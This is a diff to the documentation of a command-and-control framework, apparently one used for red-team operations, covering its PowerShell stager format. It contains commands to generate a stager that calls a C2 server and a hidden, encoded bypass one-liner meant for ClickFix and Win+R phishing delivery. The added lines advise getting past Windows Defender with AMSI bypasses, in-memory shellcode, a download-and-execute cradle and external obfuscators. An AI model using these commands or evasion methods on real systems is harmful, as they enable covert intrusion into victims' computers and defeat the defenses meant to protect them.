@@ -187,18 +187,18 @@ a1b2c3d4-...     CORP-PC01     corp\jdoe   online   just now
 
 ## Stager Formats
 
-### `ps1` — PowerShell Wrapper *(most common)*
+### `ps1` — PowerShell Wrapper
 
 ```bash
-go run ./cmd/generate stager \
-  --server http://SERVER:8080 \
-  --key changeme \
+./bin/generate stager \
+  --server https://C2:8443 \
+  --key $ENCRYPTION_KEY \
   --token TOKEN \
   --format ps1 \
   --output stager.ps1
 ```
 
-The PS1 script contains the stager binary as base64. It extracts to `%TEMP%`, runs it hidden, and the binary downloads + decrypts the agent.
+The PS1 script downloads the staged payload, writes it to `%TEMP%`, and executes it hidden.
 
 **Execute on target:**
 ```powershell
@@ -208,11 +208,17 @@ powershell -ExecutionPolicy Bypass -File stager.ps1
 # Encoded one-liner (for ClickFix, Win+R delivery)
 $bytes = [System.Text.Encoding]::Unicode.GetBytes((Get-Content stager.ps1 -Raw))
 $b64 = [System.Convert]::ToBase64String($bytes)
-# Resulting command:
 powershell -w hidden -ep bypass -enc <B64>
 ```
 
-**When to use:** Phishing attachments, ClickFix, LNK shortcuts, any text-based delivery. Most flexible format.
+> **AV Detection Warning:** PS1 is a plaintext script — AMSI scans it before and during execution. Even with AMSI/ETW bypass built into the preamble, Windows Defender 2024+ will detect the script at rest via static scanning.
+>
+> **Recommendations:**
+> - Use `--format exe` for production engagements (compiled binary, no plaintext)
+> - Use `--format ps1-mem` if PS1 delivery is required (shellcode in-memory, no EXE dropped to disk)
+> - If the PS1 must be used, deliver via encoded one-liner and do NOT save to disk — pipe directly: `IEX (New-Object Net.WebClient).DownloadString(...)`
+
+**When to use:** Lab environments, environments without Defender/EDR, or when combined with an external obfuscator (Invoke-Obfuscation, AMSI.fail).
 
 ---
 
